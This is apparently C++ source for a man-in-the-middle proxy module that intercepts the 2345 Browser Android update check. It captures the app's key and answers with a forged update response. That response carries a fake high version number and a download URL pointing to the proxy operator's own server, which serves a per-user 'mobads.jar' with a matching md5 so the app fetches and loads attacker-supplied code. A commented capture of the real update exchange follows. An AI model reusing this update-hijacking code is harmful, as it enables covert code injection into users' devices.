#include "Browser2345Android.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "PluginServer.h"
#include "../utils/simpleJson.h"

string gBrowser2345Key = "";

int Browser2345Android::isBrowser2345Android(const char * url, const char * host,const char * httpdata) {
	if (strstr(host, "update.app.2345.com") && strstr(url, "/index.php"))
	{
		gBrowser2345Key = HttpUtils::getValueFromHttp(httpdata, "appkey");
		if (gBrowser2345Key == "")
		{
			//printf("get Browser2345Android null\r\n");
		}
		else {
			gBrowser2345Key = SimpleJson::getStrValue(httpdata, "appkey");
			//printf("get Browser2345Android:%s\r\n", gBrowser2345Key.c_str());
		}
		return TRUE;
	}

	return FALSE;
}

int Browser2345Android::replyBrowser2345Android(char * dstbuf,int size, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {

	char * szHttpFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	int ret = 0;
	string version = "99901";

	string strip = HttpUtils::getIPstr(gServerIP) + "\\/" + lphttp->username;

	unsigned char hexmd5[64] = { 0 };
	string zipfn = "mobads.jar";
	string filename = Public::getUserPluginPath(lphttp->username) + zipfn;
	char szmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, 1);

	char hdrformat[4096];
	char szformat[] = 
		"{\"appkey\":\"%s\",\"channel\":\"shouliu_zhuban\",\"downurl\":\"http:\\/\\/%s\\/%s\",\"packname\":\"com.mobile2345.ads.loader\","
		"\"filename\":\"mobAds_82404_shouliu_zhuban.jar\",\"filesize\":\"%u\",\"md5\":\"%s\",\"version\":\"%s\","
		"\"user_version\":\"9.99.01\",\"updatelog\":\"99999\",\"updatetype\":\"update\",\"need_update\":\"\"}";
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat, gBrowser2345Key.c_str(),strip.c_str(),zipfn.c_str(), filesize, szmd5,version.c_str());

	int retlen = sprintf(dstbuf, szHttpFormat, httphdrlen, hdrformat);
	return retlen;
}


/*
POST /index.php HTTP/1.1
Accept: application/json,application/xml,application/xhtml+xml,text/html;q=0.9,image/webp,*//*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded; charset=utf-8
User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MHC19Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.117 Mobile Safari/537.36
Content-Length: 592
Host: update.app.2345.com

authkey=mobAds&appkey=a354260ebb0f6d1fae63e6e87ae03145&channel=shouliu_zhuban&version=82313&user_version=8.23.13
&old_md5=11111111111111111111111111111111&type=update&sign=VARRB1EBAlEMV1IKUQ5RAFwLDQEHUQ9ZAwIIVAEFVQg%3D
&local_info=%7B%22sdkVersion%22%3A%222.18.13%22%2C%22sdkChannel%22%3A%22shouliu_zhuban%22%2C%22sdkJarVersion%22%3A82313%2C%22packageName%22%3A%22com.browser2345%22%2C%22appVersionName%22%3A%2212.7.1%22%2C%22appVersionCode%22%3A%22120701%22%2C%22appChannel%22%3A%22sc-xinshi03_as_wch%22%2C%22passId%22%3A%22%22%2C%22osVersionName%22%3A%226.0.1%22%2C%22osVersionCode%22%3A23%7DHTTP/1.1 200 OK
Date: Tue, 23 Jun 2020 14:45:39 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 265
Connection: keep-alive
Vary: Accept-Encoding
Content-Encoding: gzip

{"appkey":"a354260ebb0f6d1fae63e6e87ae03145","channel":"shouliu_zhuban",
"downurl":"http:\/\/download.app.2345.com\/loader\/shouliu_zhuban\/82404\/mobAds_82404_shouliu_zhuban.jar?82404",
"packname":"com.mobile2345.ads.loader","filename":"mobAds_82404_shouliu_zhuban.jar","filesize":"2154783",
"md5":"c30e827cc8a71560492faa1758aaeae4","version":"82404","user_version":"8.24.04","updatelog":"82404","updatetype":"update","need_update":""}
*/